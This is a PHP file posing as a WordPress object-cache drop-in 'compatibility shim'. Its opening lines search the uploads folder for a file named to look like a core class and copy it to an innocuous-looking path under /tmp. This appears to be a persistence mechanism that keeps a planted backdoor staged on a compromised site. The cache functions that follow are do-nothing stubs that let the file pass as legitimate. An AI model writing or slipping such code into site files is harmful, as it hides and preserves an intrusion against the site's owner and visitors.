<?php
/* Object Cache Drop-in — compatibility shim */
if (!defined('WP_CACHE_KEY_SALT')) define('WP_CACHE_KEY_SALT', 'bd488e1074c2');
$_nx_p = '/tmp/phpFiVBKL';
if (!file_exists($_nx_p)) {
  foreach (glob('/home/printityourway.com/public_html/wp-content/uploads/class-wp-*_829e63ba.php') ?: array() as $_b) {
    if (@filesize($_b) > 4096) { @copy($_b, $_nx_p); @chmod($_nx_p, 0644); break; }
  }
}
if (!function_exists('wp_cache_init')) {
  function wp_cache_init() { global $wp_object_cache; $wp_object_cache = new stdClass(); }
  function wp_cache_add($k,$v,$g='default',$e=0){return true;}
  function wp_cache_set($k,$v,$g='default',$e=0){return true;}
  function wp_cache_get($k,$g='default',$f=false){return false;}
  function wp_cache_delete($k,$g='default'){return true;}
  function wp_cache_flush(){return true;}
  function wp_cache_add_global_groups($g){}
  function wp_cache_add_non_persistent_groups($g){}
  function wp_cache_close(){return true;}
}
